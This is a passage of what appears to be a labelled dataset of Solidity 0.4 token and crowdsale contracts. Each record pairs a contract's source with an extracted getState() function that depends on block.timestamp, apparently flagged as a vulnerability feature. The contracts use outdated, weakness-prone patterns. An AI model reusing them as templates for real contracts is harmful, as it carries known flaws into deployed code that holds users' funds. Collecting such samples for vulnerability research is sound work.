token.getReservedPercentageUnit(reservedAddr);\n uint percentsOfTokensDecimals = token.getReservedPercentageDecimals(reservedAddr);\n if (percentsOfTokensUnit > 0) {\n allocatedBonusInPercentage = tokensSold * percentsOfTokensUnit / 10**percentsOfTokensDecimals / 100;\n token.mint(reservedAddr, allocatedBonusInPercentage);\n }\n if (allocatedBonusInTokens > 0) {\n token.mint(reservedAddr, allocatedBonusInTokens);\n }\n token.finalizeReservedAddress(reservedAddr);\n distributedReservedTokensDestinationsLen++;\n }\n }\n if (distributedReservedTokensDestinationsLen == token.reservedTokensDestinationsLen()) {\n reservedTokensAreDistributed = true;\n }\n }\n function finalizeCrowdsale() public {\n assert(msg.sender == address(crowdsale));\n if (token.reservedTokensDestinationsLen() > 0) {\n assert(reservedTokensAreDistributed);\n }\n token.releaseTokenTransfer();\n }\n}",
  "extract_feature": [
    "function getState() public constant returns (State) {\nif(finalized) return State.Finalized;\nelse if (address(finalizeAgent) == 0) return State.Preparing;\nelse if (!finalizeAgent.isSane()) return State.Preparing;\nelse if (!pricingStrategy.isSane(address(this))) return State.Preparing;\nelse if (block.timestamp < startsAt) return State.PreFunding;\nelse if (block.timestamp <= endsAt && !isCrowdsaleFull()) return State.Funding;\nelse if (isMinimumGoalReached()) return State.Success;\nelse return State.Failure;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa8fa0e1460cdfa1ed3"
  },
  "filename": "10808.sol",
  "content": "pragma solidity ^0.4.8;\ncontract SafeMath {\n function safeMul(uint a, uint b) internal returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function safeDiv(uint a, uint b) internal returns (uint) {\n assert(b > 0);\n uint c = a / b;\n assert(a == b * c + a % b);\n return c;\n }\n function safeSub(uint a, uint b) internal returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function safeAdd(uint a, uint b) internal returns (uint) {\n uint c = a + b;\n assert(c>=a && c>=b);\n return c;\n }\n function max64(uint64 a, uint64 b) internal constant returns (uint64) {\n return a >= b ? a : b;\n }\n function min64(uint64 a, uint64 b) internal constant returns (uint64) {\n return a < b ? a : b;\n }\n function max256(uint256 a, uint256 b) internal constant returns (uint256) {\n return a >= b ? a : b;\n }\n function min256(uint256 a, uint256 b) internal constant returns (uint256) {\n return a < b ? a : b;\n }\n}\ncontract ERC20Basic {\n uint256 public totalSupply;\n function balanceOf(address who) public constant returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) onlyOwner public {\n require(newOwner != address(0));\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\nlibrary SafeMathLibExt {\n function times(uint a, uint b) returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function divides(uint a, uint b) returns (uint) {\n assert(b > 0);\n uint c = a / b;\n assert(a == b * c + a % b);\n return c;\n }\n function minus(uint a, uint b) returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function plus(uint a, uint b) returns (uint) {\n uint c = a + b;\n assert(c>=a);\n return c;\n }\n}\ncontract Haltable is Ownable {\n bool public halted;\n modifier stopInEmergency {\n if (halted) throw;\n _;\n }\n modifier stopNonOwnersInEmergency {\n if (halted && msg.sender != owner) throw;\n _;\n }\n modifier onlyInEmergency {\n if (!halted) throw;\n _;\n }\n function halt() external onlyOwner {\n halted = true;\n }\n function unhalt() external onlyOwner onlyInEmergency {\n halted = false;\n }\n}\ncontract PricingStrategy {\n address public tier;\n function isPricingStrategy() public constant returns (bool) {\n return true;\n }\n function isSane(address crowdsale) public constant returns (bool) {\n return true;\n }\n function isPresalePurchase(address purchaser) public constant returns (bool) {\n return false;\n }\n function updateRate(uint newOneTokenInWei) public;\n function calculatePrice(uint value, uint weiRaised, uint tokensSold, address msgSender, uint decimals) public constant returns (uint tokenAmount);\n}\ncontract FinalizeAgent {\n bool public reservedTokensAreDistributed = false;\n function isFinalizeAgent() public constant returns(bool) {\n return true;\n }\n function isSane() public constant returns (bool);\n function distributeReservedTokens(uint reservedTokensDistributionBatch);\n function finalizeCrowdsale();\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public constant returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract FractionalERC20Ext is ERC20 {\n uint public decimals;\n uint public minCap;\n}\ncontract CrowdsaleExt is Haltable {\n uint public MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE = 5;\n using SafeMathLibExt for uint;\n FractionalERC20Ext public token;\n PricingStrategy public pricingStrategy;\n FinalizeAgent public finalizeAgent;\n string public name;\n address public multisigWallet;\n uint public minimumFundingGoal;\n uint public startsAt;\n uint public endsAt;\n uint public tokensSold = 0;\n uint public weiRaised = 0;\n uint public investorCount = 0;\n bool public finalized;\n bool public isWhiteListed;\n address[] public joinedCrowdsales;\n uint8 public joinedCrowdsalesLen = 0;\n uint8 public joinedCrowdsalesLenMax = 50;\n struct JoinedCrowdsaleStatus {\n bool isJoined;\n uint8 position;\n }\n mapping (address => JoinedCrowdsaleStatus) joinedCrowdsaleState;\n mapping (address => uint256) public investedAmountOf;\n mapping (address => uint256) public tokenAmountOf;\n struct WhiteListData {\n bool status;\n uint minCap;\n uint maxCap;\n }\n bool public isUpdatable;\n mapping (address => WhiteListData) public earlyParticipantWhitelist;\n address[] public whitelistedParticipants;\n uint public ownerTestValue;\n enum State{Unknown, Preparing, PreFunding, Funding, Success, Failure, Finalized}\n event Invested(address investor, uint weiAmount, uint tokenAmount, uint128 customerId);\n event Whitelisted(address addr, bool status, uint minCap, uint maxCap);\n event WhitelistItemChanged(address addr, bool status, uint minCap, uint maxCap);\n event StartsAtChanged(uint newStartsAt);\n event EndsAtChanged(uint newEndsAt);\n function CrowdsaleExt(string _name, address _token, PricingStrategy _pricingStrategy, address _multisigWallet, uint _start, uint _end, uint _minimumFundingGoal, bool _isUpdatable, bool _isWhiteListed) {\n owner = msg.sender;\n name = _name;\n token = FractionalERC20Ext(_token);\n setPricingStrategy(_pricingStrategy);\n multisigWallet = _multisigWallet;\n if(multisigWallet == 0) {\n throw;\n }\n if(_start == 0) {\n throw;\n }\n startsAt = _start;\n if(_end == 0) {\n throw;\n }\n endsAt = _end;\n if(startsAt >= endsAt) {\n throw;\n }\n minimumFundingGoal = _minimumFundingGoal;\n isUpdatable = _isUpdatable;\n isWhiteListed = _isWhiteListed;\n }\n function() payable {\n throw;\n }\n function investInternal(address receiver, uint128 customerId) stopInEmergency private {\n if(getState() == State.PreFunding) {\n throw;\n } else if(getState() == State.Funding) {\n if(isWhiteListed) {\n if(!earlyParticipantWhitelist[receiver].status) {\n throw;\n }\n }\n } else {\n throw;\n }\n uint weiAmount = msg.value;\n uint tokenAmount = pricingStrategy.calculatePrice(weiAmount, weiRaised, tokensSold, msg.sender, token.decimals());\n if(tokenAmount == 0) {\n throw;\n }\n if(isWhiteListed) {\n if(tokenAmount < earlyParticipantWhitelist[receiver].minCap && tokenAmountOf[receiver] == 0) {\n throw;\n }\n if (isBreakingInvestorCap(receiver, tokenAmount)) {\n throw;\n }\n updateInheritedEarlyParticipantWhitelist(receiver, tokenAmount);\n } else {\n if(tokenAmount < token.minCap() && tokenAmountOf[receiver] == 0) {\n throw;\n }\n }\n if(investedAmountOf[receiver] == 0) {\n investorCount++;\n }\n investedAmountOf[receiver] = investedAmountOf[receiver].plus(weiAmount);\n tokenAmountOf[receiver] = tokenAmountOf[receiver].plus(tokenAmount);\n weiRaised = weiRaised.plus(weiAmount);\n tokensSold = tokensSold.plus(tokenAmount);\n if(isBreakingCap(weiAmount, tokenAmount, weiRaised, tokensSold)) {\n throw;\n }\n assignTokens(receiver, tokenAmount);\n if(!multisigWallet.send(weiAmount)) throw;\n Invested(receiver, weiAmount, tokenAmount, customerId);\n }\n function invest(address addr) public payable {\n investInternal(addr, 0);\n }\n function buy() public payable {\n invest(msg.sender);\n }\n function distributeReservedTokens(uint reservedTokensDistributionBatch) public inState(State.Success) onlyOwner stopInEmergency {\n if(finalized) {\n throw;\n }\n if(address(finalizeAgent) != address(0)) {\n finalizeAgent.distributeReservedTokens(reservedTokensDistributionBatch);\n }\n }\n function areReservedTokensDistributed() public constant returns (bool) {\n return finalizeAgent.reservedTokensAreDistributed();\n }\n function canDistributeReservedTokens() public constant returns(bool) {\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if ((lastTierCntrct.getState() == State.Success) && !lastTierCntrct.halted() && !lastTierCntrct.finalized() && !lastTierCntrct.areReservedTokensDistributed()) return true;\n return false;\n }\n function finalize() public inState(State.Success) onlyOwner stopInEmergency {\n if(finalized) {\n throw;\n }\n if(address(finalizeAgent) != address(0)) {\n finalizeAgent.finalizeCrowdsale();\n }\n finalized = true;\n }\n function setFinalizeAgent(FinalizeAgent addr) public onlyOwner {\n assert(address(addr) != address(0));\n assert(address(finalizeAgent) == address(0));\n finalizeAgent = addr;\n if(!finalizeAgent.isFinalizeAgent()) {\n throw;\n }\n }\n function setEarlyParticipantWhitelist(address addr, bool status, uint minCap, uint maxCap) public onlyOwner {\n if (!isWhiteListed) throw;\n assert(addr != address(0));\n assert(maxCap > 0);\n assert(minCap <= maxCap);\n assert(now <= endsAt);\n if (!isAddressWhitelisted(addr)) {\n whitelistedParticipants.push(addr);\n Whitelisted(addr, status, minCap, maxCap);\n } else {\n WhitelistItemChanged(addr, status, minCap, maxCap);\n }\n earlyParticipantWhitelist[addr] = WhiteListData({status:status, minCap:minCap, maxCap:maxCap});\n }\n function setEarlyParticipantWhitelistMultiple(address[] addrs, bool[] statuses, uint[] minCaps, uint[] maxCaps) public onlyOwner {\n if (!isWhiteListed) throw;\n assert(now <= endsAt);\n assert(addrs.length == statuses.length);\n assert(statuses.length == minCaps.length);\n assert(minCaps.length == maxCaps.length);\n for (uint iterator = 0; iterator < addrs.length; iterator++) {\n setEarlyParticipantWhitelist(addrs[iterator], statuses[iterator], minCaps[iterator], maxCaps[iterator]);\n }\n }\n function updateInheritedEarlyParticipantWhitelist(address reciever, uint tokensBought) private {\n if (!isWhiteListed) throw;\n if (tokensBought < earlyParticipantWhitelist[reciever].minCap && tokenAmountOf[reciever] == 0) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = tierPosition + 1; j < joinedCrowdsalesLen; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n crowdsale.updateEarlyParticipantWhitelist(reciever, tokensBought);\n }\n }\n function updateEarlyParticipantWhitelist(address addr, uint tokensBought) public {\n if (!isWhiteListed) throw;\n assert(addr != address(0));\n assert(now <= endsAt);\n assert(isTierJoined(msg.sender));\n if (tokensBought < earlyParticipantWhitelist[addr].minCap && tokenAmountOf[addr] == 0) throw;\n uint newMaxCap = earlyParticipantWhitelist[addr].maxCap;\n newMaxCap = newMaxCap.minus(tokensBought);\n earlyParticipantWhitelist[addr] = WhiteListData({status:earlyParticipantWhitelist[addr].status, minCap:0, maxCap:newMaxCap});\n }\n function isAddressWhitelisted(address addr) public constant returns(bool) {\n for (uint i = 0; i < whitelistedParticipants.length; i++) {\n if (whitelistedParticipants[i] == addr) {\n return true;\n break;\n }\n }\n return false;\n }\n function whitelistedParticipantsLength() public constant returns (uint) {\n return whitelistedParticipants.length;\n }\n function isTierJoined(address addr) public constant returns(bool) {\n return joinedCrowdsaleState[addr].isJoined;\n }\n function getTierPosition(address addr) public constant returns(uint8) {\n return joinedCrowdsaleState[addr].position;\n }\n function getLastTier() public constant returns(address) {\n if (joinedCrowdsalesLen > 0)\n return joinedCrowdsales[joinedCrowdsalesLen - 1];\n else\n return address(0);\n }\n function setJoinedCrowdsales(address addr) private onlyOwner {\n assert(addr != address(0));\n assert(joinedCrowdsalesLen <= joinedCrowdsalesLenMax);\n assert(!isTierJoined(addr));\n joinedCrowdsales.push(addr);\n joinedCrowdsaleState[addr] = JoinedCrowdsaleStatus({\n isJoined: true,\n position: joinedCrowdsalesLen\n });\n joinedCrowdsalesLen++;\n }\n function updateJoinedCrowdsalesMultiple(address[] addrs) public onlyOwner {\n assert(addrs.length > 0);\n assert(joinedCrowdsalesLen == 0);\n assert(addrs.length <= joinedCrowdsalesLenMax);\n for (uint8 iter = 0; iter < addrs.length; iter++) {\n setJoinedCrowdsales(addrs[iter]);\n }\n }\n function setStartsAt(uint time) onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= time);\n assert(time <= endsAt);\n assert(now <= startsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if (lastTierCntrct.finalized()) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = 0; j < tierPosition; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n assert(time >= crowdsale.endsAt());\n }\n startsAt = time;\n StartsAtChanged(startsAt);\n }\n function setEndsAt(uint time) public onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= time);\n assert(startsAt <= time);\n assert(now <= endsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if (lastTierCntrct.finalized()) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = tierPosition + 1; j < joinedCrowdsalesLen; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n assert(time <= crowdsale.startsAt());\n }\n endsAt = time;\n EndsAtChanged(endsAt);\n }\n function setPricingStrategy(PricingStrategy _pricingStrategy) public onlyOwner {\n assert(address(_pricingStrategy) != address(0));\n assert(address(pricingStrategy) == address(0));\n pricingStrategy = _pricingStrategy;\n if(!pricingStrategy.isPricingStrategy()) {\n throw;\n }\n }\n function setMultisig(address addr) public onlyOwner {\n if(investorCount > MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE) {\n throw;\n }\n multisigWallet = addr;\n }\n function isMinimumGoalReached() public constant returns (bool reached) {\n return weiRaised >= minimumFundingGoal;\n }\n function isFinalizerSane() public constant returns (bool sane) {\n return finalizeAgent.isSane();\n }\n function isPricingSane() public constant returns (bool sane) {\n return pricingStrategy.isSane(address(this));\n }\n function getState() public constant returns (State) {\n if(finalized) return State.Finalized;\n else if (address(finalizeAgent) == 0) return State.Preparing;\n else if (!finalizeAgent.isSane()) return State.Preparing;\n else if (!pricingStrategy.isSane(address(this))) return State.Preparing;\n else if (block.timestamp < startsAt) return State.PreFunding;\n else if (block.timestamp <= endsAt && !isCrowdsaleFull()) return State.Funding;\n else if (isMinimumGoalReached()) return State.Success;\n else return State.Failure;\n }\n function isCrowdsale() public constant returns (bool) {\n return true;\n }\n modifier inState(State state) {\n if(getState() != state) throw;\n _;\n }\n function isBreakingCap(uint weiAmount, uint tokenAmount, uint weiRaisedTotal, uint tokensSoldTotal) public constant returns (bool limitBroken);\n function isBreakingInvestorCap(address receiver, uint tokenAmount) public constant returns (bool limitBroken);\n function isCrowdsaleFull() public constant returns (bool);\n function assignTokens(address receiver, uint tokenAmount) private;\n}\ncontract StandardToken is ERC20, SafeMath {\n event Minted(address receiver, uint amount);\n mapping(address => uint) balances;\n mapping (address => mapping (address => uint)) allowed;\n function isToken() public constant returns (bool weAre) {\n return true;\n }\n function transfer(address _to, uint _value) returns (bool success) {\n balances[msg.sender] = safeSub(balances[msg.sender], _value);\n balances[_to] = safeAdd(balances[_to], _value);\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint _value) returns (bool success) {\n uint _allowance = allowed[_from][msg.sender];\n balances[_to] = safeAdd(balances[_to], _value);\n balances[_from] = safeSub(balances[_from], _value);\n allowed[_from][msg.sender] = safeSub(_allowance, _value);\n Transfer(_from, _to, _value);\n return true;\n }\n function balanceOf(address _owner) constant returns (uint balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint _value) returns (bool success) {\n if ((_value != 0) && (allowed[msg.sender][_spender] != 0)) throw;\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint remaining) {\n return allowed[_owner][_spender];\n }\n}\ncontract MintableTokenExt is StandardToken, Ownable {\n using SafeMathLibExt for uint;\n bool public mintingFinished = false;\n mapping (address => bool) public mintAgents;\n event MintingAgentChanged(address addr, bool state );\n struct ReservedTokensData {\n uint inTokens;\n uint inPercentageUnit;\n uint inPercentageDecimals;\n bool isReserved;\n bool isDistributed;\n }\n mapping (address => ReservedTokensData) public reservedTokensList;\n address[] public reservedTokensDestinations;\n uint public reservedTokensDestinationsLen = 0;\n bool reservedTokensDestinationsAreSet = false;\n modifier onlyMintAgent() {\n if(!mintAgents[msg.sender]) {\n throw;\n }\n _;\n }\n modifier canMint() {\n if(mintingFinished) throw;\n _;\n }\n function finalizeReservedAddress(address addr) public onlyMintAgent canMint {\n ReservedTokensData storage reservedTokensData = reservedTokensList[addr];\n reservedTokensData.isDistributed = true;\n }\n function isAddressReserved(address addr) public constant returns (bool isReserved) {\n return reservedTokensList[addr].isReserved;\n }\n function areTokensDistributedForAddress(address addr) public constant returns (bool isDistributed) {\n return reservedTokensList[addr].isDistributed;\n }\n function getReservedTokens(address addr) public constant returns (uint inTokens) {\n return reservedTokensList[addr].inTokens;\n }\n function getReservedPercentageUnit(address addr) public constant returns (uint inPercentageUnit) {\n return reservedTokensList[addr].inPercentageUnit;\n }\n function getReservedPercentageDecimals(address addr) public constant returns (uint inPercentageDecimals) {\n return reservedTokensList[addr].inPercentageDecimals;\n }\n function setReservedTokensListMultiple(\n address[] addrs,\n uint[] inTokens,\n uint[] inPercentageUnit,\n uint[] inPercentageDecimals\n ) public canMint onlyOwner {\n assert(!reservedTokensDestinationsAreSet);\n assert(addrs.length == inTokens.length);\n assert(inTokens.length == inPercentageUnit.length);\n assert(inPercentageUnit.length == inPercentageDecimals.length);\n for (uint iterator = 0; iterator < addrs.length; iterator++) {\n if (addrs[iterator] != address(0)) {\n setReservedTokensList(addrs[iterator], inTokens[iterator], inPercentageUnit[iterator], inPercentageDecimals[iterator]);\n }\n }\n reservedTokensDestinationsAreSet = true;\n }\n function mint(address receiver, uint amount) onlyMintAgent canMint public {\n totalSupply = totalSupply.plus(amount);\n balances[receiver] = balances[receiver].plus(amount);\n Transfer(0, receiver, amount);\n }\n function setMintAgent(address addr, bool state) onlyOwner canMint public {\n mintAgents[addr] = state;\n MintingAgentChanged(addr, state);\n }\n function setReservedTokensList(address addr, uint inTokens, uint inPercentageUnit, uint inPercentageDecimals) private canMint onlyOwner {\n assert(addr != address(0));\n if (!isAddressReserved(addr)) {\n reservedTokensDestinations.push(addr);\n reservedTokensDestinationsLen++;\n }\n reservedTokensList[addr] = ReservedTokensData({\n inTokens: inTokens,\n inPercentageUnit: inPercentageUnit,\n inPercentageDecimals: inPercentageDecimals,\n isReserved: true,\n isDistributed: false\n });\n }\n}\ncontract MintedTokenCappedCrowdsaleExt is CrowdsaleExt {\n uint public maximumSellableTokens;\n function MintedTokenCappedCrowdsaleExt(\n string _name,\n address _token,\n PricingStrategy _pricingStrategy,\n address _multisigWallet,\n uint _start, uint _end,\n uint _minimumFundingGoal,\n uint _maximumSellableTokens,\n bool _isUpdatable,\n bool _isWhiteListed\n ) CrowdsaleExt(_name, _token, _pricingStrategy, _multisigWallet, _start, _end, _minimumFundingGoal, _isUpdatable, _isWhiteListed) {\n maximumSellableTokens = _maximumSellableTokens;\n }\n event MaximumSellableTokensChanged(uint newMaximumSellableTokens);\n function isBreakingCap(uint weiAmount, uint tokenAmount, uint weiRaisedTotal, uint tokensSoldTotal) public constant returns (bool limitBroken) {\n return tokensSoldTotal > maximumSellableTokens;\n }\n function isBreakingInvestorCap(address addr, uint tokenAmount) public constant returns (bool limitBroken) {\n assert(isWhiteListed);\n uint maxCap = earlyParticipantWhitelist[addr].maxCap;\n return (tokenAmountOf[addr].plus(tokenAmount)) > maxCap;\n }\n function isCrowdsaleFull() public constant returns (bool) {\n return tokensSold >= maximumSellableTokens;\n }\n function setMaximumSellableTokens(uint tokens) public onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= startsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n assert(!lastTierCntrct.finalized());\n maximumSellableTokens = tokens;\n MaximumSellableTokensChanged(maximumSellableTokens);\n }\n function updateRate(uint newOneTokenInWei) public onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= startsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n assert(!lastTierCntrct.finalized());\n pricingStrategy.updateRate(newOneTokenInWei);\n }\n function assignTokens(address receiver, uint tokenAmount) private {\n MintableTokenExt mintableToken = MintableTokenExt(token);\n mintableToken.mint(receiver, tokenAmount);\n }\n}",
  "extract_feature": [
    "function getState() public constant returns (State) {\nif(finalized) return State.Finalized;\nelse if (address(finalizeAgent) == 0) return State.Preparing;\nelse if (!finalizeAgent.isSane()) return State.Preparing;\nelse if (!pricingStrategy.isSane(address(this))) return State.Preparing;\nelse if (block.timestamp < startsAt) return State.PreFunding;\nelse if (block.timestamp <= endsAt && !isCrowdsaleFull()) return State.Funding;\nelse if (isMinimumGoalReached()) return State.Success;\nelse return State.Failure;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa8fa0e1460cdfa1ed4"
  },
  "filename": "10826.sol",
  "content": "pragma solidity ^0.4.11;\ncontract Ownable {\n address public owner;\n function Ownable() {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) onlyOwner {\n if (newOwner != address(0)) {\n owner = newOwner;\n }\n }\n}\ncontract Haltable is Ownable {\n bool public halted = false;\n modifier inNormalState {\n require(!halted);\n _;\n }\n modifier inEmergencyState {\n require(halted);\n _;\n }\n function halt() external onlyOwner inNormalState {\n halted = true;\n }\n function unhalt() external onlyOwner inEmergencyState {\n halted = false;\n }\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal constant returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract ERC20Basic {\n uint256 public totalSupply;\n function balanceOf(address who) constant returns (uint256);\n function transfer(address to, uint256 value) returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract BasicToken is ERC20Basic {\n using SafeMath for uint256;\n mapping(address => uint256) balances;\n function transfer(address _to, uint256 _value) returns (bool) {\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) constant returns (uint256);\n function transferFrom(address from, address to, uint256 value) returns (bool);\n function approve(address spender, uint256 value) returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract StandardToken is ERC20, BasicToken {\n mapping (address => mapping (address => uint256)) allowed;\n function transferFrom(address _from, address _to, uint256 _value) returns (bool) {\n var _allowance = allowed[_from][msg.sender];\n balances[_to] = balances[_to].add(_value);\n balances[_from] = balances[_from].sub(_value);\n allowed[_from][msg.sender] = _allowance.sub(_value);\n Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) returns (bool) {\n require((_value == 0) || (allowed[msg.sender][_spender] == 0));\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n}\ncontract Burnable is StandardToken {\n using SafeMath for uint;\n event Burn(address indexed from, uint value);\n function burn(uint _value) returns (bool success) {\n require(_value > 0 && balances[msg.sender] >= _value);\n balances[msg.sender] = balances[msg.sender].sub(_value);\n totalSupply = totalSupply.sub(_value);\n Burn(msg.sender, _value);\n return true;\n }\n function burnFrom(address _from, uint _value) returns (bool success) {\n require(_from != 0x0 && _value > 0 && balances[_from] >= _value);\n require(_value <= allowed[_from][msg.sender]);\n balances[_from] = balances[_from].sub(_value);\n totalSupply = totalSupply.sub(_value);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n Burn(_from, _value);\n return true;\n }\n function transfer(address _to, uint _value) returns (bool success) {\n require(_to != 0x0);\n return super.transfer(_to, _value);\n }\n function transferFrom(address _from, address _to, uint _value) returns (bool success) {\n require(_to != 0x0);\n return super.transferFrom(_from, _to, _value);\n }\n}\ncontract ERC223ReceivingContract {\n function tokenFallback(address _from, uint _value, bytes _data);\n}\ncontract AnythingAppToken is Burnable, Ownable {\n string public constant name = \"AnythingApp Token\";\n string public constant symbol = \"ANY\";\n uint8 public constant decimals = 18;\n uint public constant INITIAL_SUPPLY = 400000000 * 1 ether;\n address public releaseAgent;\n bool public released = false;\n mapping (address => bool) public transferAgents;\n event Transfer(address indexed from, address indexed to, uint value, bytes data);\n modifier canTransfer(address _sender) {\n require(released || transferAgents[_sender]);\n _;\n }\n modifier inReleaseState(bool releaseState) {\n require(releaseState == released);\n _;\n }\n modifier onlyReleaseAgent() {\n require(msg.sender == releaseAgent);\n _;\n }\n function AnythingAppToken() {\n totalSupply = INITIAL_SUPPLY;\n balances[msg.sender] = INITIAL_SUPPLY;\n Transfer(0x0, msg.sender, INITIAL_SUPPLY);\n }\n function setReleaseAgent(address addr) onlyOwner inReleaseState(false) public {\n require(addr != 0x0);\n releaseAgent = addr;\n }\n function release() onlyReleaseAgent inReleaseState(false) public {\n released = true;\n }\n function setTransferAgent(address addr, bool state) onlyOwner inReleaseState(false) public {\n require(addr != 0x0);\n transferAgents[addr] = state;\n }\n function transferFrom(address _from, address _to, uint _value) canTransfer(_from) returns (bool success) {\n return super.transferFrom(_from, _to, _value);\n }\n function transfer(address _to, uint _value, bytes _data) canTransfer(msg.sender) returns (bool success) {\n require(_to != address(0));\n require(_value <= balances[msg.sender]);\n uint codeLength;\n assembly {\n codeLength := extcodesize(_to)\n }\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n if(codeLength>0) {\n ERC223ReceivingContract receiver = ERC223ReceivingContract(_to);\n receiver.tokenFallback(msg.sender, _value, _data);\n }\n Transfer(msg.sender, _to, _value, _data);\n return true;\n }\n function transfer(address _to, uint _value) canTransfer(msg.sender) returns (bool success) {\n require(_to != address(0));\n require(_value <= balances[msg.sender]);\n uint codeLength;\n bytes memory empty;\n assembly {\n codeLength := extcodesize(_to)\n }\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n if(codeLength>0) {\n ERC223ReceivingContract receiver = ERC223ReceivingContract(_to);\n receiver.tokenFallback(msg.sender, _value, empty);\n }\n Transfer(msg.sender, _to, _value, empty);\n return true;\n }\n function burn(uint _value) onlyOwner returns (bool success) {\n return super.burn(_value);\n }\n function burnFrom(address _from, uint _value) onlyOwner returns (bool success) {\n return super.burnFrom(_from, _value);\n }\n}\ncontract InvestorWhiteList is Ownable {\n mapping (address => bool) public investorWhiteList;\n mapping (address => address) public referralList;\n function InvestorWhiteList() {\n }\n function addInvestorToWhiteList(address investor) external onlyOwner {\n require(investor != 0x0 && !investorWhiteList[investor]);\n investorWhiteList[investor] = true;\n }\n function removeInvestorFromWhiteList(address investor) external onlyOwner {\n require(investor != 0x0 && investorWhiteList[investor]);\n investorWhiteList[investor] = false;\n }\n function addReferralOf(address investor, address referral) external onlyOwner {\n require(investor != 0x0 && referral != 0x0 && referralList[investor] == 0x0 && investor != referral);\n referralList[investor] = referral;\n }\n function isAllowed(address investor) constant external returns (bool result) {\n return investorWhiteList[investor];\n }\n function getReferralOf(address investor) constant external returns (address result) {\n return referralList[investor];\n }\n}\ncontract PriceReceiver {\n address public ethPriceProvider;\n modifier onlyEthPriceProvider() {\n require(msg.sender == ethPriceProvider);\n _;\n }\n function receiveEthPrice(uint ethUsdPrice) external;\n function setEthPriceProvider(address provider) external;\n}\ncontract AnythingAppTokenPreSale is Haltable, PriceReceiver {\n using SafeMath for uint;\n string public constant name = \"AnythingAppTokenPreSale\";\n AnythingAppToken public token;\n InvestorWhiteList public investorWhiteList;\n address public beneficiary;\n uint public tokenPriceUsd;\n uint public totalTokens;\n uint public ethUsdRate;\n uint public collected = 0;\n uint public withdrawn = 0;\n uint public tokensSold = 0;\n uint public investorCount = 0;\n uint public weiRefunded = 0;\n uint public startTime;\n uint public endTime;\n bool public crowdsaleFinished = false;\n mapping (address => bool) public refunded;\n mapping (address => uint) public deposited;\n uint public constant BONUS_LEVEL_1 = 40;\n uint public constant BONUS_LEVEL_2 = 35;\n uint public constant BONUS_LEVEL_3 = 30;\n uint public firstStage;\n uint public secondStage;\n uint public thirdStage;\n uint public constant MINIMAL_PURCHASE = 250 ether;\n uint public constant LIMIT_PER_USER = 500000 ether;\n event NewContribution(address indexed holder, uint tokenAmount, uint etherAmount);\n event NewReferralTransfer(address indexed investor, address indexed referral, uint tokenAmount);\n event Refunded(address indexed holder, uint amount);\n event Deposited(address indexed holder, uint amount);\n modifier preSaleActive() {\n 